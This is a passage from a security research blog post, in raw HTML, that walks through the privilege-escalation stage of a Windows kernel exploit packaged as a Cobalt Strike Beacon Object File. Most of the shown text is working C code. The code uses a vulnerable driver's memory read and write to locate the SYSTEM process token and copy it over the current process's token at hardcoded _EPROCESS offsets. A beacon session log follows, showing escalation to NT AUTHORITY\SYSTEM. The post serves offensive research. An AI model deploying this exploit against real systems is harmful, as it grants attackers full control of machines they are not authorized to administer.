    <span class="cp">#define GetLastError KERNEL32$GetLastError
#endif</span></code></pre></figure><p><a href="https://raw.githubusercontent.com/tijme/kernel-mii/master/headers/imports.h" target="_blank" rel="noopener noreferrer">Here’s</a> an example header file for various Windows API function definitions.</p><h4 id="37-privilege-escalation">3.7 Privilege Escalation</h4><p>The last thing we need to do is perform the actual privilege escalation on the current process. We’ll do this as follows.</p><ol><li>Find <code class="language-plaintext highlighter-rouge">PsInitialSystemProcess</code> offset in <code class="language-plaintext highlighter-rouge">ntoskrnl.exe</code>.</li><li>Take note of <code class="language-plaintext highlighter-rouge">PsInitialSystemProcess's</code> token.</li><li>Iterate the <code class="language-plaintext highlighter-rouge">_EPROCESS</code> chain until our own process is found.</li><li>Overwrite our token with <code class="language-plaintext highlighter-rouge">PsInitialSystemProcess's</code> token.</li></ol><p><strong>Find <code class="language-plaintext highlighter-rouge">PsInitialSystemProcess</code> offset in <code class="language-plaintext highlighter-rouge">ntoskrnl.exe</code></strong></p><p>The first step can be achieved by retrieving the variable <code class="language-plaintext highlighter-rouge">PsInitialSystemProcess</code> from <code class="language-plaintext highlighter-rouge">ntoskrnl.exe</code> using <code class="language-plaintext highlighter-rouge">GetProcAddress(...)</code>.</p><figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">HMODULE</span> <span class="n">hNtOsKrnl</span> <span class="o">=</span> <span class="n">LoadLibraryExW</span><span class="p">(</span><span class="s">L"ntoskrnl.exe"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">DONT_RESOLVE_DLL_REFERENCES</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">hNtOsKrnl</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">PRINT_ERROR</span><span class="p">(</span><span class="s">"Cannot load 'ntoskrnl.exe'."</span><span class="p">);</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">size_t</span> <span class="n">systemProcessOffset</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)</span> <span class="p">((</span><span class="kt">size_t</span><span class="p">)</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hNtOsKrnl</span><span class="p">,</span> <span class="s">"PsInitialSystemProcess"</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span> <span class="n">hNtOsKrnl</span><span class="p">);</span>
<span class="n">PRINT_DEBUG</span><span class="p">(</span><span class="s">"Identified 'PsInitialSystemProcess' at 0x%x."</span><span class="p">,</span> <span class="n">systemProcessOffset</span><span class="p">);</span></code></pre></figure><p><strong>Take note of <code class="language-plaintext highlighter-rouge">PsInitialSystemProcess's</code> token.</strong></p><p>The second step can be achieved by obtaining the kernel base (for which there are <a href="https://github.com/tijme/kernel-mii/blob/master/KernelMii.c#L175" target="_blank" rel="noopener noreferrer">various</a> options), and then using the base and system process offset to find the system process, and then its token.</p><figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">uint8_t</span><span class="o">*</span> <span class="n">systemProcessPointerAddress</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)</span> <span class="p">((</span><span class="kt">size_t</span><span class="p">)</span> <span class="n">kernelBase</span> <span class="o">+</span> <span class="n">systemProcessOffset</span><span class="p">);</span>
<span class="n">PRINT_DEBUG</span><span class="p">(</span><span class="s">"Identified system process pointer address at %p."</span><span class="p">,</span> <span class="n">systemProcessPointerAddress</span><span class="p">);</span>

<span class="kt">uint8_t</span><span class="o">*</span> <span class="n">systemProcessAddress</span> <span class="o">=</span> <span class="n">memoryRead</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">systemProcessPointerAddress</span><span class="p">);</span>
<span class="n">PRINT_DEBUG</span><span class="p">(</span><span class="s">"Identified system process address at %p."</span><span class="p">,</span> <span class="n">systemProcessAddress</span><span class="p">);</span>

<span class="kt">uint8_t</span><span class="o">*</span> <span class="n">systemProcessToken</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)</span> <span class="p">((</span><span class="kt">size_t</span><span class="p">)</span> <span class="n">memoryRead</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">systemProcessAddress</span> <span class="o">+</span> <span class="mh">0x4b8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffffff0</span><span class="p">);</span>
<span class="n">PRINT_DEBUG</span><span class="p">(</span><span class="s">"Identified system process token at %p."</span><span class="p">,</span> <span class="n">systemProcessToken</span><span class="p">);</span></code></pre></figure><p><strong>Iterate the <code class="language-plaintext highlighter-rouge">_EPROCESS</code> chain until our own process is found</strong></p><p>To find our own process, we find the active process linked list in the system’s <code class="language-plaintext highlighter-rouge">_EPROCESS</code>. We iterate the list until the <code class="language-plaintext highlighter-rouge">_EPROCESS</code> ID equals our own process ID.</p><figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">uint8_t</span><span class="o">*</span> <span class="n">activeProcessLinks</span> <span class="o">=</span> <span class="n">memoryRead</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">systemProcessAddress</span> <span class="o">+</span> <span class="mh">0x448</span><span class="p">);</span>
<span class="n">PRINT_DEBUG</span><span class="p">(</span><span class="s">"Identified active process links at %p."</span><span class="p">,</span> <span class="n">activeProcessLinks</span><span class="p">);</span>

<span class="k">while</span> <span class="p">(</span><span class="nb">true</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">memoryRead</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">activeProcessLinks</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="n">GetCurrentProcessId</span><span class="p">())</span> <span class="p">{</span>
        <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">currentProcess</span> <span class="o">=</span> <span class="n">activeProcessLinks</span> <span class="o">-</span> <span class="mh">0x448</span><span class="p">;</span>
        <span class="n">PRINT_DEBUG</span><span class="p">(</span><span class="s">"Found current process (beacon) at %p."</span><span class="p">,</span> <span class="n">currentProcess</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">activeProcessLinks</span> <span class="o">=</span> <span class="n">memoryRead</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">activeProcessLinks</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure><p><strong>Overwrite our token with <code class="language-plaintext highlighter-rouge">PsInitialSystemProcess's</code> token</strong></p><p>The last step is to adjust the code in the step above to overwrite the token if our <code class="language-plaintext highlighter-rouge">_EPROCESS</code> is found. We overwrite the token of our own process, at offset <code class="language-plaintext highlighter-rouge">0x4b8</code>, with the token of the system process.</p><figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">uint8_t</span><span class="o">*</span> <span class="n">activeProcessLinks</span> <span class="o">=</span> <span class="n">memoryRead</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">systemProcessAddress</span> <span class="o">+</span> <span class="mh">0x448</span><span class="p">);</span>
<span class="n">PRINT_DEBUG</span><span class="p">(</span><span class="s">"Identified active process links at %p."</span><span class="p">,</span> <span class="n">activeProcessLinks</span><span class="p">);</span>

<span class="k">while</span> <span class="p">(</span><span class="nb">true</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">memoryRead</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">activeProcessLinks</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="n">GetCurrentProcessId</span><span class="p">())</span> <span class="p">{</span>
        <span class="kt">uint8_t</span><span class="o">*</span> <span class="n">currentProcess</span> <span class="o">=</span> <span class="n">activeProcessLinks</span> <span class="o">-</span> <span class="mh">0x448</span><span class="p">;</span>
        <span class="n">PRINT_DEBUG</span><span class="p">(</span><span class="s">"Found current process (beacon) at %p."</span><span class="p">,</span> <span class="n">currentProcess</span><span class="p">);</span>
        <span class="n">memoryWrite</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">currentProcess</span> <span class="o">+</span> <span class="mh">0x4b8</span><span class="p">,</span> <span class="n">systemProcessToken</span><span class="p">);</span>
        <span class="n">PRINT_DEBUG</span><span class="p">(</span><span class="s">"Setting current process (beacon) token to system process token."</span><span class="p">);</span>
        <span class="n">PRINT_DEBUG</span><span class="p">(</span><span class="s">"Exploit executed successfully! You are now SYSTEM."</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">activeProcessLinks</span> <span class="o">=</span> <span class="n">memoryRead</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">activeProcessLinks</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure><h3 id="4-usage">4. Usage</h3><p>If we compile our code and load it into Cobalt Strike via its script manager, we can use it to escalate privileges (if the vulnerable driver is installed and running). This can be done as seen in the command and corresponding output below.</p><figure class="highlight"><pre><code class="language-plain" data-lang="plain">beacon &gt; getuid
[*] Tasked beacon to get userid
[+] host called home, sent : 8 bytes
[*] You are WINDOWS-10\WDKRemoteUser
beacon &gt; kernel_mii
[+] host called home, sent : 21626 bytes
[+] received output
Identifying if vulnerable kernel driver is installed.
Identified 'PsInitialSystemProcess' at 0xCFB420.
Identified 'ntoskrnl.exe' base address at 0x4FC00000.
Identified system process pointer address at 0XFFFFF801508FB420.
Identified system process address at 0XFFFF8C05E565D040.
Identified system process token at 0XFFFFA30329445850.
Identified active process links at 0XFFFF8C05E570C4C8.
Found current process (beacon) at 0XFFFF8C05EB973080.
Setting current process (beacon) token to system process token.
Exploit executed successfully! You are now SYSTEM.
beacon &gt; getuid
[*] Tasked beacon to get userid
[+] host called home, sent : 8 bytes
[*] You are NT AUTHORITY\SYSTEM (admin)</code></pre></figure><h3 id="5-result">5. Result</h3><p>The results of this research are <a href="https://github.com/tijme/kernel-mii" target="_blank" rel="noopener noreferrer">available</a> on GitHub. This includes the compiled Beacon Object File and PE-file.</p></article><footer class="text-center mt-5 mb-5"><div class="footer-links"> <a href="/"><span>Posts</span></a> <a href="/about/" target="_self"><span>About</span></a> <a href="/donate/" target="_self"><span>Donate</span></a> <a href="/responsible-disclosure/" target="_self"><span>Responsible Disclosure</span></a></div><p class="footer-copyright text-secondary"> Copyright &copy; 2024 Tijme Gommers. All rights reserved.</p><div class="footer-icons"><div class="padding"> <a href="https://twitter.com/tijme" target="_blank" rel="noopener nofollow"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#twitter"/></svg> </span></span> </a></div><div class="padding"> <a href="https://github.com/tijme" target="_blank" rel="noopener nofollow"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#github"/></svg> </span></span> </a></div><div class="padding"> <a href="https://www.linkedin.com/in/tijme" target="_blank" rel="noopener nofollow"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#linkedin"/></svg> </span></span> </a></div></div></footer></div></div></div></body></html>
